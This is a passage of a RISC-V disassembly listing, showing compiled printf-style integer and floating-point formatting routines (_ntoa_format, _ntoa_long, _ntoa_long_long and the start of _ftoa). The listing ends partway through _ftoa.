    10003260:	2781                	sext.w	a5,a5
    10003262:	ebd1                	bnez	a5,100032f6 <_ntoa_format+0xc8>
    10003264:	441c                	lw	a5,8(s0)
    10003266:	2781                	sext.w	a5,a5
    10003268:	cf9d                	beqz	a5,100032a6 <_ntoa_format+0x78>
    1000326a:	481c                	lw	a5,16(s0)
    1000326c:	8b85                	andi	a5,a5,1
    1000326e:	2781                	sext.w	a5,a5
    10003270:	cb9d                	beqz	a5,100032a6 <_ntoa_format+0x78>
    10003272:	fbf44783          	lbu	a5,-65(s0)
    10003276:	0ff7f793          	zext.b	a5,a5
    1000327a:	e789                	bnez	a5,10003284 <_ntoa_format+0x56>
    1000327c:	481c                	lw	a5,16(s0)
    1000327e:	8bb1                	andi	a5,a5,12
    10003280:	2781                	sext.w	a5,a5
    10003282:	c395                	beqz	a5,100032a6 <_ntoa_format+0x78>
    10003284:	441c                	lw	a5,8(s0)
    10003286:	37fd                	addiw	a5,a5,-1
    10003288:	c41c                	sw	a5,8(s0)
    1000328a:	a831                	j	100032a6 <_ntoa_format+0x78>
    1000328c:	fc043783          	ld	a5,-64(s0)
    10003290:	00178713          	addi	a4,a5,1
    10003294:	fce43023          	sd	a4,-64(s0)
    10003298:	fc843703          	ld	a4,-56(s0)
    1000329c:	97ba                	add	a5,a5,a4
    1000329e:	03000713          	li	a4,48
    100032a2:	00e78023          	sb	a4,0(a5)
    100032a6:	00046783          	lwu	a5,0(s0)
    100032aa:	fc043703          	ld	a4,-64(s0)
    100032ae:	02f77563          	bgeu	a4,a5,100032d8 <_ntoa_format+0xaa>
    100032b2:	fc043703          	ld	a4,-64(s0)
    100032b6:	47fd                	li	a5,31
    100032b8:	fce7fae3          	bgeu	a5,a4,1000328c <_ntoa_format+0x5e>
    100032bc:	a831                	j	100032d8 <_ntoa_format+0xaa>
    100032be:	fc043783          	ld	a5,-64(s0)
    100032c2:	00178713          	addi	a4,a5,1
    100032c6:	fce43023          	sd	a4,-64(s0)
    100032ca:	fc843703          	ld	a4,-56(s0)
    100032ce:	97ba                	add	a5,a5,a4
    100032d0:	03000713          	li	a4,48
    100032d4:	00e78023          	sb	a4,0(a5)
    100032d8:	481c                	lw	a5,16(s0)
    100032da:	8b85                	andi	a5,a5,1
    100032dc:	2781                	sext.w	a5,a5
    100032de:	cf81                	beqz	a5,100032f6 <_ntoa_format+0xc8>
    100032e0:	00846783          	lwu	a5,8(s0)
    100032e4:	fc043703          	ld	a4,-64(s0)
    100032e8:	00f77763          	bgeu	a4,a5,100032f6 <_ntoa_format+0xc8>
    100032ec:	fc043703          	ld	a4,-64(s0)
    100032f0:	47fd                	li	a5,31
    100032f2:	fce7f6e3          	bgeu	a5,a4,100032be <_ntoa_format+0x90>
    100032f6:	481c                	lw	a5,16(s0)
    100032f8:	8bc1                	andi	a5,a5,16
    100032fa:	2781                	sext.w	a5,a5
    100032fc:	12078363          	beqz	a5,10003422 <_ntoa_format+0x1f4>
    10003300:	481c                	lw	a5,16(s0)
    10003302:	4007f793          	andi	a5,a5,1024
    10003306:	2781                	sext.w	a5,a5
    10003308:	e7a1                	bnez	a5,10003350 <_ntoa_format+0x122>
    1000330a:	fc043783          	ld	a5,-64(s0)
    1000330e:	c3a9                	beqz	a5,10003350 <_ntoa_format+0x122>
    10003310:	00046783          	lwu	a5,0(s0)
    10003314:	fc043703          	ld	a4,-64(s0)
    10003318:	00f70863          	beq	a4,a5,10003328 <_ntoa_format+0xfa>
    1000331c:	00846783          	lwu	a5,8(s0)
    10003320:	fc043703          	ld	a4,-64(s0)
    10003324:	02f71663          	bne	a4,a5,10003350 <_ntoa_format+0x122>
    10003328:	fc043783          	ld	a5,-64(s0)
    1000332c:	17fd                	addi	a5,a5,-1
    1000332e:	fcf43023          	sd	a5,-64(s0)
    10003332:	fc043783          	ld	a5,-64(s0)
    10003336:	cf89                	beqz	a5,10003350 <_ntoa_format+0x122>
    10003338:	fb842783          	lw	a5,-72(s0)
    1000333c:	0007871b          	sext.w	a4,a5
    10003340:	47c1                	li	a5,16
    10003342:	00f71763          	bne	a4,a5,10003350 <_ntoa_format+0x122>
    10003346:	fc043783          	ld	a5,-64(s0)
    1000334a:	17fd                	addi	a5,a5,-1
    1000334c:	fcf43023          	sd	a5,-64(s0)
    10003350:	fb842783          	lw	a5,-72(s0)
    10003354:	0007871b          	sext.w	a4,a5
    10003358:	47c1                	li	a5,16
    1000335a:	02f71a63          	bne	a4,a5,1000338e <_ntoa_format+0x160>
    1000335e:	481c                	lw	a5,16(s0)
    10003360:	0207f793          	andi	a5,a5,32
    10003364:	2781                	sext.w	a5,a5
    10003366:	e785                	bnez	a5,1000338e <_ntoa_format+0x160>
    10003368:	fc043703          	ld	a4,-64(s0)
    1000336c:	47fd                	li	a5,31
    1000336e:	02e7e063          	bltu	a5,a4,1000338e <_ntoa_format+0x160>
    10003372:	fc043783          	ld	a5,-64(s0)
    10003376:	00178713          	addi	a4,a5,1
    1000337a:	fce43023          	sd	a4,-64(s0)
    1000337e:	fc843703          	ld	a4,-56(s0)
    10003382:	97ba                	add	a5,a5,a4
    10003384:	07800713          	li	a4,120
    10003388:	00e78023          	sb	a4,0(a5)
    1000338c:	a88d                	j	100033fe <_ntoa_format+0x1d0>
    1000338e:	fb842783          	lw	a5,-72(s0)
    10003392:	0007871b          	sext.w	a4,a5
    10003396:	47c1                	li	a5,16
    10003398:	02f71a63          	bne	a4,a5,100033cc <_ntoa_format+0x19e>
    1000339c:	481c                	lw	a5,16(s0)
    1000339e:	0207f793          	andi	a5,a5,32
    100033a2:	2781                	sext.w	a5,a5
    100033a4:	c785                	beqz	a5,100033cc <_ntoa_format+0x19e>
    100033a6:	fc043703          	ld	a4,-64(s0)
    100033aa:	47fd                	li	a5,31
    100033ac:	02e7e063          	bltu	a5,a4,100033cc <_ntoa_format+0x19e>
    100033b0:	fc043783          	ld	a5,-64(s0)
    100033b4:	00178713          	addi	a4,a5,1
    100033b8:	fce43023          	sd	a4,-64(s0)
    100033bc:	fc843703          	ld	a4,-56(s0)
    100033c0:	97ba                	add	a5,a5,a4
    100033c2:	05800713          	li	a4,88
    100033c6:	00e78023          	sb	a4,0(a5)
    100033ca:	a815                	j	100033fe <_ntoa_format+0x1d0>
    100033cc:	fb842783          	lw	a5,-72(s0)
    100033d0:	0007871b          	sext.w	a4,a5
    100033d4:	4789                	li	a5,2
    100033d6:	02f71463          	bne	a4,a5,100033fe <_ntoa_format+0x1d0>
    100033da:	fc043703          	ld	a4,-64(s0)
    100033de:	47fd                	li	a5,31
    100033e0:	00e7ef63          	bltu	a5,a4,100033fe <_ntoa_format+0x1d0>
    100033e4:	fc043783          	ld	a5,-64(s0)
    100033e8:	00178713          	addi	a4,a5,1
    100033ec:	fce43023          	sd	a4,-64(s0)
    100033f0:	fc843703          	ld	a4,-56(s0)
    100033f4:	97ba                	add	a5,a5,a4
    100033f6:	06200713          	li	a4,98
    100033fa:	00e78023          	sb	a4,0(a5)
    100033fe:	fc043703          	ld	a4,-64(s0)
    10003402:	47fd                	li	a5,31
    10003404:	00e7ef63          	bltu	a5,a4,10003422 <_ntoa_format+0x1f4>
    10003408:	fc043783          	ld	a5,-64(s0)
    1000340c:	00178713          	addi	a4,a5,1
    10003410:	fce43023          	sd	a4,-64(s0)
    10003414:	fc843703          	ld	a4,-56(s0)
    10003418:	97ba                	add	a5,a5,a4
    1000341a:	03000713          	li	a4,48
    1000341e:	00e78023          	sb	a4,0(a5)
    10003422:	fc043703          	ld	a4,-64(s0)
    10003426:	47fd                	li	a5,31
    10003428:	06e7e863          	bltu	a5,a4,10003498 <_ntoa_format+0x26a>
    1000342c:	fbf44783          	lbu	a5,-65(s0)
    10003430:	0ff7f793          	zext.b	a5,a5
    10003434:	cf99                	beqz	a5,10003452 <_ntoa_format+0x224>
    10003436:	fc043783          	ld	a5,-64(s0)
    1000343a:	00178713          	addi	a4,a5,1
    1000343e:	fce43023          	sd	a4,-64(s0)
    10003442:	fc843703          	ld	a4,-56(s0)
    10003446:	97ba                	add	a5,a5,a4
    10003448:	02d00713          	li	a4,45
    1000344c:	00e78023          	sb	a4,0(a5)
    10003450:	a0a1                	j	10003498 <_ntoa_format+0x26a>
    10003452:	481c                	lw	a5,16(s0)
    10003454:	8b91                	andi	a5,a5,4
    10003456:	2781                	sext.w	a5,a5
    10003458:	cf99                	beqz	a5,10003476 <_ntoa_format+0x248>
    1000345a:	fc043783          	ld	a5,-64(s0)
    1000345e:	00178713          	addi	a4,a5,1
    10003462:	fce43023          	sd	a4,-64(s0)
    10003466:	fc843703          	ld	a4,-56(s0)
    1000346a:	97ba                	add	a5,a5,a4
    1000346c:	02b00713          	li	a4,43
    10003470:	00e78023          	sb	a4,0(a5)
    10003474:	a015                	j	10003498 <_ntoa_format+0x26a>
    10003476:	481c                	lw	a5,16(s0)
    10003478:	8ba1                	andi	a5,a5,8
    1000347a:	2781                	sext.w	a5,a5
    1000347c:	cf91                	beqz	a5,10003498 <_ntoa_format+0x26a>
    1000347e:	fc043783          	ld	a5,-64(s0)
    10003482:	00178713          	addi	a4,a5,1
    10003486:	fce43023          	sd	a4,-64(s0)
    1000348a:	fc843703          	ld	a4,-56(s0)
    1000348e:	97ba                	add	a5,a5,a4
    10003490:	02000713          	li	a4,32
    10003494:	00e78023          	sb	a4,0(a5)
    10003498:	4818                	lw	a4,16(s0)
    1000349a:	441c                	lw	a5,8(s0)
    1000349c:	88ba                	mv	a7,a4
    1000349e:	883e                	mv	a6,a5
    100034a0:	fc043783          	ld	a5,-64(s0)
    100034a4:	fc843703          	ld	a4,-56(s0)
    100034a8:	fd043683          	ld	a3,-48(s0)
    100034ac:	fd843603          	ld	a2,-40(s0)
    100034b0:	fe043583          	ld	a1,-32(s0)
    100034b4:	fe843503          	ld	a0,-24(s0)
    100034b8:	c65ff0ef          	jal	1000311c <_out_rev>
    100034bc:	87aa                	mv	a5,a0
    100034be:	853e                	mv	a0,a5
    100034c0:	60a6                	ld	ra,72(sp)
    100034c2:	6406                	ld	s0,64(sp)
    100034c4:	6161                	addi	sp,sp,80
    100034c6:	8082                	ret

Disassembly of section .text._ntoa_long:

00000000100034c8 <_ntoa_long>:
    100034c8:	7135                	addi	sp,sp,-160
    100034ca:	ed06                	sd	ra,152(sp)
    100034cc:	e922                	sd	s0,144(sp)
    100034ce:	1100                	addi	s0,sp,160
    100034d0:	faa43c23          	sd	a0,-72(s0)
    100034d4:	fab43823          	sd	a1,-80(s0)
    100034d8:	fac43423          	sd	a2,-88(s0)
    100034dc:	fad43023          	sd	a3,-96(s0)
    100034e0:	f8e43c23          	sd	a4,-104(s0)
    100034e4:	f9043423          	sd	a6,-120(s0)
    100034e8:	8746                	mv	a4,a7
    100034ea:	f8f40ba3          	sb	a5,-105(s0)
    100034ee:	87ba                	mv	a5,a4
    100034f0:	f8f42823          	sw	a5,-112(s0)
    100034f4:	fe043423          	sd	zero,-24(s0)
    100034f8:	f9843783          	ld	a5,-104(s0)
    100034fc:	e781                	bnez	a5,10003504 <_ntoa_long+0x3c>
    100034fe:	441c                	lw	a5,8(s0)
    10003500:	9bbd                	andi	a5,a5,-17
    10003502:	c41c                	sw	a5,8(s0)
    10003504:	441c                	lw	a5,8(s0)
    10003506:	4007f793          	andi	a5,a5,1024
    1000350a:	2781                	sext.w	a5,a5
    1000350c:	c781                	beqz	a5,10003514 <_ntoa_long+0x4c>
    1000350e:	f9843783          	ld	a5,-104(s0)
    10003512:	c3d9                	beqz	a5,10003598 <_ntoa_long+0xd0>
    10003514:	f9843703          	ld	a4,-104(s0)
    10003518:	f8843783          	ld	a5,-120(s0)
    1000351c:	02f777b3          	remu	a5,a4,a5
    10003520:	fef403a3          	sb	a5,-25(s0)
    10003524:	fe744783          	lbu	a5,-25(s0)
    10003528:	0ff7f713          	zext.b	a4,a5
    1000352c:	47a5                	li	a5,9
    1000352e:	00e7e963          	bltu	a5,a4,10003540 <_ntoa_long+0x78>
    10003532:	fe744783          	lbu	a5,-25(s0)
    10003536:	0307879b          	addiw	a5,a5,48
    1000353a:	0ff7f793          	zext.b	a5,a5
    1000353e:	a01d                	j	10003564 <_ntoa_long+0x9c>
    10003540:	441c                	lw	a5,8(s0)
    10003542:	0207f793          	andi	a5,a5,32
    10003546:	2781                	sext.w	a5,a5
    10003548:	c781                	beqz	a5,10003550 <_ntoa_long+0x88>
    1000354a:	04100793          	li	a5,65
    1000354e:	a019                	j	10003554 <_ntoa_long+0x8c>
    10003550:	06100793          	li	a5,97
    10003554:	fe744703          	lbu	a4,-25(s0)
    10003558:	9fb9                	addw	a5,a5,a4
    1000355a:	0ff7f793          	zext.b	a5,a5
    1000355e:	37d9                	addiw	a5,a5,-10
    10003560:	0ff7f793          	zext.b	a5,a5
    10003564:	fe843703          	ld	a4,-24(s0)
    10003568:	00170693          	addi	a3,a4,1 # ffff001 <_start-0xfff>
    1000356c:	fed43423          	sd	a3,-24(s0)
    10003570:	1741                	addi	a4,a4,-16
    10003572:	9722                	add	a4,a4,s0
    10003574:	fcf70823          	sb	a5,-48(a4)
    10003578:	f9843703          	ld	a4,-104(s0)
    1000357c:	f8843783          	ld	a5,-120(s0)
    10003580:	02f757b3          	divu	a5,a4,a5
    10003584:	f8f43c23          	sd	a5,-104(s0)
    10003588:	f9843783          	ld	a5,-104(s0)
    1000358c:	c791                	beqz	a5,10003598 <_ntoa_long+0xd0>
    1000358e:	fe843703          	ld	a4,-24(s0)
    10003592:	47fd                	li	a5,31
    10003594:	f8e7f0e3          	bgeu	a5,a4,10003514 <_ntoa_long+0x4c>
    10003598:	f8843783          	ld	a5,-120(s0)
    1000359c:	0007861b          	sext.w	a2,a5
    100035a0:	f9744683          	lbu	a3,-105(s0)
    100035a4:	fc040713          	addi	a4,s0,-64
    100035a8:	441c                	lw	a5,8(s0)
    100035aa:	e83e                	sd	a5,16(sp)
    100035ac:	401c                	lw	a5,0(s0)
    100035ae:	e43e                	sd	a5,8(sp)
    100035b0:	f9042783          	lw	a5,-112(s0)
    100035b4:	e03e                	sd	a5,0(sp)
    100035b6:	88b2                	mv	a7,a2
    100035b8:	8836                	mv	a6,a3
    100035ba:	fe843783          	ld	a5,-24(s0)
    100035be:	fa043683          	ld	a3,-96(s0)
    100035c2:	fa843603          	ld	a2,-88(s0)
    100035c6:	fb043583          	ld	a1,-80(s0)
    100035ca:	fb843503          	ld	a0,-72(s0)
    100035ce:	c61ff0ef          	jal	1000322e <_ntoa_format>
    100035d2:	87aa                	mv	a5,a0
    100035d4:	853e                	mv	a0,a5
    100035d6:	60ea                	ld	ra,152(sp)
    100035d8:	644a                	ld	s0,144(sp)
    100035da:	610d                	addi	sp,sp,160
    100035dc:	8082                	ret

Disassembly of section .text._ntoa_long_long:

00000000100035de <_ntoa_long_long>:
    100035de:	7135                	addi	sp,sp,-160
    100035e0:	ed06                	sd	ra,152(sp)
    100035e2:	e922                	sd	s0,144(sp)
    100035e4:	1100                	addi	s0,sp,160
    100035e6:	faa43c23          	sd	a0,-72(s0)
    100035ea:	fab43823          	sd	a1,-80(s0)
    100035ee:	fac43423          	sd	a2,-88(s0)
    100035f2:	fad43023          	sd	a3,-96(s0)
    100035f6:	f8e43c23          	sd	a4,-104(s0)
    100035fa:	f9043423          	sd	a6,-120(s0)
    100035fe:	8746                	mv	a4,a7
    10003600:	f8f40ba3          	sb	a5,-105(s0)
    10003604:	87ba                	mv	a5,a4
    10003606:	f8f42823          	sw	a5,-112(s0)
    1000360a:	fe043423          	sd	zero,-24(s0)
    1000360e:	f9843783          	ld	a5,-104(s0)
    10003612:	e781                	bnez	a5,1000361a <_ntoa_long_long+0x3c>
    10003614:	441c                	lw	a5,8(s0)
    10003616:	9bbd                	andi	a5,a5,-17
    10003618:	c41c                	sw	a5,8(s0)
    1000361a:	441c                	lw	a5,8(s0)
    1000361c:	4007f793          	andi	a5,a5,1024
    10003620:	2781                	sext.w	a5,a5
    10003622:	c781                	beqz	a5,1000362a <_ntoa_long_long+0x4c>
    10003624:	f9843783          	ld	a5,-104(s0)
    10003628:	c3d9                	beqz	a5,100036ae <_ntoa_long_long+0xd0>
    1000362a:	f9843703          	ld	a4,-104(s0)
    1000362e:	f8843783          	ld	a5,-120(s0)
    10003632:	02f777b3          	remu	a5,a4,a5
    10003636:	fef403a3          	sb	a5,-25(s0)
    1000363a:	fe744783          	lbu	a5,-25(s0)
    1000363e:	0ff7f713          	zext.b	a4,a5
    10003642:	47a5                	li	a5,9
    10003644:	00e7e963          	bltu	a5,a4,10003656 <_ntoa_long_long+0x78>
    10003648:	fe744783          	lbu	a5,-25(s0)
    1000364c:	0307879b          	addiw	a5,a5,48
    10003650:	0ff7f793          	zext.b	a5,a5
    10003654:	a01d                	j	1000367a <_ntoa_long_long+0x9c>
    10003656:	441c                	lw	a5,8(s0)
    10003658:	0207f793          	andi	a5,a5,32
    1000365c:	2781                	sext.w	a5,a5
    1000365e:	c781                	beqz	a5,10003666 <_ntoa_long_long+0x88>
    10003660:	04100793          	li	a5,65
    10003664:	a019                	j	1000366a <_ntoa_long_long+0x8c>
    10003666:	06100793          	li	a5,97
    1000366a:	fe744703          	lbu	a4,-25(s0)
    1000366e:	9fb9                	addw	a5,a5,a4
    10003670:	0ff7f793          	zext.b	a5,a5
    10003674:	37d9                	addiw	a5,a5,-10
    10003676:	0ff7f793          	zext.b	a5,a5
    1000367a:	fe843703          	ld	a4,-24(s0)
    1000367e:	00170693          	addi	a3,a4,1
    10003682:	fed43423          	sd	a3,-24(s0)
    10003686:	1741                	addi	a4,a4,-16
    10003688:	9722                	add	a4,a4,s0
    1000368a:	fcf70823          	sb	a5,-48(a4)
    1000368e:	f9843703          	ld	a4,-104(s0)
    10003692:	f8843783          	ld	a5,-120(s0)
    10003696:	02f757b3          	divu	a5,a4,a5
    1000369a:	f8f43c23          	sd	a5,-104(s0)
    1000369e:	f9843783          	ld	a5,-104(s0)
    100036a2:	c791                	beqz	a5,100036ae <_ntoa_long_long+0xd0>
    100036a4:	fe843703          	ld	a4,-24(s0)
    100036a8:	47fd                	li	a5,31
    100036aa:	f8e7f0e3          	bgeu	a5,a4,1000362a <_ntoa_long_long+0x4c>
    100036ae:	f8843783          	ld	a5,-120(s0)
    100036b2:	0007861b          	sext.w	a2,a5
    100036b6:	f9744683          	lbu	a3,-105(s0)
    100036ba:	fc040713          	addi	a4,s0,-64
    100036be:	441c                	lw	a5,8(s0)
    100036c0:	e83e                	sd	a5,16(sp)
    100036c2:	401c                	lw	a5,0(s0)
    100036c4:	e43e                	sd	a5,8(sp)
    100036c6:	f9042783          	lw	a5,-112(s0)
    100036ca:	e03e                	sd	a5,0(sp)
    100036cc:	88b2                	mv	a7,a2
    100036ce:	8836                	mv	a6,a3
    100036d0:	fe843783          	ld	a5,-24(s0)
    100036d4:	fa043683          	ld	a3,-96(s0)
    100036d8:	fa843603          	ld	a2,-88(s0)
    100036dc:	fb043583          	ld	a1,-80(s0)
    100036e0:	fb843503          	ld	a0,-72(s0)
    100036e4:	b4bff0ef          	jal	1000322e <_ntoa_format>
    100036e8:	87aa                	mv	a5,a0
    100036ea:	853e                	mv	a0,a5
    100036ec:	60ea                	ld	ra,152(sp)
    100036ee:	644a                	ld	s0,144(sp)
    100036f0:	610d                	addi	sp,sp,160
    100036f2:	8082                	ret

Disassembly of section .text._ftoa:

00000000100036f4 <_ftoa>:
    100036f4:	7135                	addi	sp,sp,-160
    100036f6:	ed06                	sd	ra,152(sp)
    100036f8:	e922                	sd	s0,144(sp)
    100036fa:	1100                	addi	s0,sp,160
    100036fc:	f8a43c23          	sd	a0,-104(s0)
    10003700:	f8b43823          	sd	a1,-112(s0)
    10003704:	f8c43423          	sd	a2,-120(s0)
    10003708:	f8d43023          	sd	a3,-128(s0)
    1000370c:	f6a43c27          	fsd	fa0,-136(s0)
    10003710:	863a                	mv	a2,a4
    10003712:	86be                	mv	a3,a5
    10003714:	8742                	mv	a4,a6
    10003716:	87b2                	mv	a5,a2
    10003718:	f6f42a23          	sw	a5,-140(s0)
    1000371c:	87b6                	mv	a5,a3
    1000371e:	f6f42823          	sw	a5,-144(s0)
    10003722:	87ba                	mv	a5,a4
    10003724:	f6f42623          	sw	a5,-148(s0)
    10003728:	fe043423          	sd	zero,-24(s0)
    1000372c:	f20007d3          	fmv.d.x	fa5,zero
    10003730:	fcf43427          	fsd	fa5,-56(s0)
    10003734:	f7843707          	fld	fa4,-136(s0)
    10003738:	f7843787          	fld	fa5,-136(s0)
    1000373c:	a2f727d3          	feq.d	a5,fa4,fa5
    10003740:	eb85                	bnez	a5,10003770 <_ftoa+0x7c>
    10003742:	f6c42703          	lw	a4,-148(s0)
    10003746:	f7042783          	lw	a5,-144(s0)
    1000374a:	88ba                	mv	a7,a4
    1000374c:	883e                	mv	a6,a5
    1000374e:	478d                	li	a5,3
    10003750:	00002717          	auipc	a4,0x2
    10003754:	13870713          	addi	a4,a4,312 # 10005888 <__am_mainargs+0x143>
    10003758:	f8043683          	ld	a3,-128(s0)
    1000375c:	f8843603          	ld	a2,-120(s0)
    10003760:	f9043583          	ld	a1,-112(s0)
    10003764:	f9843503          	ld	a0,-104(s0)
    10003768:	9b5ff0ef          	jal	1000311c <_out_rev>
    1000376c:	87aa                	mv	a5,a0
    1000376e:	a97d                	j	10003c2c <_ftoa+0x538>
    10003770:	f7843707          	fld	fa4,-136(s0)
    10003774:	00002797          	auipc	a5,0x2
    10003778:	13478793          	addi	a5,a5,308 # 100058a8 <__am_mainargs+0x163>
    1000377c:	239c                	fld	fa5,0(a5)
    1000377e:	a2f717d3          	flt.d	a5,fa4,fa5
    10003782:	cb85                	beqz	a5,100037b2 <_ftoa+0xbe>
    10003784:	f6c42703          	lw	a4,-148(s0)
    10003788:	f7042783          	lw	a5,-144(s0)
    1000378c:	88ba                	mv	a7,a4
    1000378e:	883e                	mv	a6,a5
    10003790:	4791                	li	a5,4
    10003792:	00002717          	auipc	a4,0x2
    10003796:	0fe70713          	addi	a4,a4,254 # 10005890 <__am_mainargs+0x14b>
    1000379a:	f8043683          	ld	a3,-128(s0)
    1000379e:	f8843603          	ld	a2,-120(s0)
    100037a2:	f9043583          	ld	a1,-112(s0)
    100037a6:	f9843503          	ld	a0,-104(s0)
    100037aa:	973ff0ef          	jal	1000311c <_out_rev>
    100037ae:	87aa                	mv	a5,a0
    100037b0:	a9b5                	j	10003c2c <_ftoa+0x538>
    100037b2:	f7843707          	fld	fa4,-136(s0)
    100037b6:	00002797          	auipc	a5,0x2
    100037ba:	0fa78793          	addi	a5,a5,250 # 100058b0 <__am_mainargs+0x16b>
    100037be:	239c                	fld	fa5,0(a5)
    100037c0:	a2e797d3          	flt.d	a5,fa5,fa4
    100037c4:	cba9                	beqz	a5,10003816 <_ftoa+0x122>
    100037c6:	f6c42783          	lw	a5,-148(s0)
    100037ca:	8b91                	andi	a5,a5,4
    100037cc:	2781                	sext.w	a5,a5
    100037ce:	c791                	beqz	a5,100037da <_ftoa+0xe6>
    100037d0:	00002717          	auipc	a4,0x2
    100037d4:	0c870713          	addi	a4,a4,200 # 10005898 <__am_mainargs+0x153>
    100037d8:	a029                	j	100037e2 <_ftoa+0xee>
    100037da:	00002717          	auipc	a4,0x2
    100037de:	0c670713          	addi	a4,a4,198 # 100058a0 <__am_mainargs+0x15b>
    100037e2:	f6c42783          	lw	a5,-148(s0)
    100037e6:	8b91                	andi	a5,a5,4
    100037e8:	2781                	sext.w	a5,a5
    100037ea:	c399                	beqz	a5,100037f0 <_ftoa+0xfc>
    100037ec:	4791                	li	a5,4
    100037ee:	a011                	j	100037f2 <_ftoa+0xfe>
    100037f0:	478d                	li	a5,3
    100037f2:	f6c42603          	lw	a2,-148(s0)
    100037f6:	f7042683          	lw	a3,-144(s0)
    100037fa:	88b2                	mv	a7,a2
    100037fc:	8836                	mv	a6,a3
    100037fe:	f8043683          	ld	a3,-128(s0)
    10003802:	f8843603          	ld	a2,-120(s0)
    10003806:	f9043583          	ld	a1,-112(s0)
    1000380a:	f9843503          	ld	a0,-104(s0)
    1000380e:	90fff0ef          	jal	1000311c <_out_rev>
    10003812:	87aa                	mv	a5,a0
    10003814:	a921                	j	10003c2c <_ftoa+0x538>
    10003816:	f7843707          	fld	fa4,-136(s0)
    1000381a:	00002797          	auipc	a5,0x2
    1000381e:	09e78793          	addi	a5,a5,158 # 100058b8 <__am_mainargs+0x173>
    10003822:	239c                	fld	fa5,0(a5)
    10003824:	a2e797d3          	flt.d	a5,fa5,fa4
    10003828:	eb99                	bnez	a5,1000383e <_ftoa+0x14a>
    1000382a:	f7843707          	fld	fa4,-136(s0)
    1000382e:	00002797          	auipc	a5,0x2
    10003832:	09278793          	addi	a5,a5,146 # 100058c0 <__am_mainargs+0x17b>
    10003836:	239c                	fld	fa5,0(a5)
    10003838:	a2f717d3          	flt.d	a5,fa4,fa5
    1000383c:	c795                	beqz	a5,10003868 <_ftoa+0x174>
    1000383e:	f6c42683          	lw	a3,-148(s0)
    10003842:	f7042783          	lw	a5,-144(s0)
    10003846:	f7442703          	lw	a4,-140(s0)
    1000384a:	8836                	mv	a6,a3
    1000384c:	f7843507          	fld	fa0,-136(s0)
    10003850:	f8043683          	ld	a3,-128(s0)
    10003854:	f8843603          	ld	a2,-120(s0)
    10003858:	f9043583          	ld	a1,-112(s0)
    1000385c:	f9843503          	ld	a0,-104(s0)
    10003860:	3d6000ef          	jal	10003c36 <_etoa>
    10003864:	87aa                	mv	a5,a0
    10003866:	a6d9                	j	10003c2c <_ftoa+0x538>
    10003868:	fe0403a3          	sb	zero,-25(s0)
    1000386c:	f7843787          	fld	fa5,-136(s0)
    10003870:	f2000753          	fmv.d.x	fa4,zero
    10003874:	a2e797d3          	flt.d	a5,fa5,fa4
    10003878:	cf81                	beqz	a5,10003890 <_ftoa+0x19c>
    1000387a:	4785                	li	a5,1
    1000387c:	fef403a3          	sb	a5,-25(s0)
    10003880:	f2000753          	fmv.d.x	fa4,zero
    10003884:	f7843787          	fld	fa5,-136(s0)
    10003888:	0af777d3          	fsub.d	fa5,fa4,fa5
    1000388c:	f6f43c27          	fsd	fa5,-136(s0)
    10003890:	f6c42783          	lw	a5,-148(s0)
    10003894:	4007f793          	andi	a5,a5,1024
    10003898:	2781                	sext.w	a5,a5
    1000389a:	e795                	bnez	a5,100038c6 <_ftoa+0x1d2>
    1000389c:	4799                	li	a5,6
    1000389e:	f6f42a23          	sw	a5,-140(s0)
    100038a2:	a015                	j	100038c6 <_ftoa+0x1d2>
    100038a4:	fe843783          	ld	a5,-24(s0)
    100038a8:	00178713          	addi	a4,a5,1
    100038ac:	fee43423          	sd	a4,-24(s0)
    100038b0:	17c1                	addi	a5,a5,-16
    100038b2:	97a2                	add	a5,a5,s0
    100038b4:	03000713          	li	a4,48
    100038b8:	fae78823          	sb	a4,-80(a5)
    100038bc:	f7442783          	lw	a5,-140(s0)
    100038c0:	37fd                	addiw	a5,a5,-1
    100038c2:	f6f42a23          	sw	a5,-140(s0)
    100038c6:	fe843703          	ld	a4,-24(s0)
    100038ca:	47fd                	li	a5,31
    100038cc:	00e7e963          	bltu	a5,a4,100038de <_ftoa+0x1ea>
    100038d0:	f7442783          	lw	a5,-140(s0)
    100038d4:	0007871b          	sext.w	a4,a5
    100038d8:	47a5                	li	a5,9
    100038da:	fce7e5e3          	bltu	a5,a4,100038a4 <_ftoa+0x1b0>
    100038de:	f7843787          	fld	fa5,-136(s0)
    100038e2:	c20797d3          	fcvt.w.d	a5,fa5,rtz
    100038e6:	fef42023          	sw	a5,-32(s0)
    100038ea:	fe042783          	lw	a5,-32(s0)
    100038ee:	d20787d3          	fcvt.d.w	fa5,a5
    100038f2:	f7843707          	fld	fa4,-136(s0)
    100038f6:	0af77753          	fsub.d	fa4,fa4,fa5
    100038fa:	00002717          	auipc	a4,0x2
    100038fe:	1e670713          	addi	a4,a4,486 # 10005ae0 <pow10.0>
    10003902:	f7446783          	lwu	a5,-140(s0)
    10003906:	078e                	slli	a5,a5,0x3
    10003908:	97ba                	add	a5,a5,a4
    1000390a:	239c                	fld	fa5,0(a5)
    1000390c:	12f777d3          	fmul.d	fa5,fa4,fa5
    10003910:	fcf43027          	fsd	fa5,-64(s0)
    10003914:	fc043787          	fld	fa5,-64(s0)
    10003918:	c23797d3          	fcvt.lu.d	a5,fa5,rtz
    1000391c:	fcf43c23          	sd	a5,-40(s0)
    10003920:	fd843783          	ld	a5,-40(s0)
    10003924:	d237f7d3          	fcvt.d.lu	fa5,a5
    10003928:	fc043707          	fld	fa4,-64(s0)
    1000392c:	0af777d3          	fsub.d	fa5,fa4,fa5
    10003930:	fcf43427          	fsd	fa5,-56(s0)
    10003934:	fc843707          	fld	fa4,-56(s0)
    10003938:	00002797          	auipc	a5,0x2
    1000393c:	f9078793          	addi	a5,a5,-112 # 100058c8 <__am_mainargs+0x183>
    10003940:	239c                	fld	fa5,0(a5)
    10003942:	a2e797d3          	flt.d	a5,fa5,fa4
    10003946:	cf95                	beqz	a5,10003982 <_ftoa+0x28e>
    10003948:	fd843783          	ld	a5,-40(s0)
    1000394c:	0785                	addi	a5,a5,1
    1000394e:	fcf43c23          	sd	a5,-40(s0)
    10003952:	fd843783          	ld	a5,-40(s0)
    10003956:	d237f753          	fcvt.d.lu	fa4,a5
    1000395a:	00002717          	auipc	a4,0x2
    1000395e:	18670713          	addi	a4,a4,390 # 10005ae0 <pow10.0>
    10003962:	f7446783          	lwu	a5,-140(s0)
    10003966:	078e                	slli	a5,a5,0x3
    10003968:	97ba                	add	a5,a5,a4
    1000396a:	239c                	fld	fa5,0(a5)
    1000396c:	a2e787d3          	fle.d	a5,fa5,fa4
    10003970:	cf9d                	beqz	a5,100039ae <_ftoa+0x2ba>
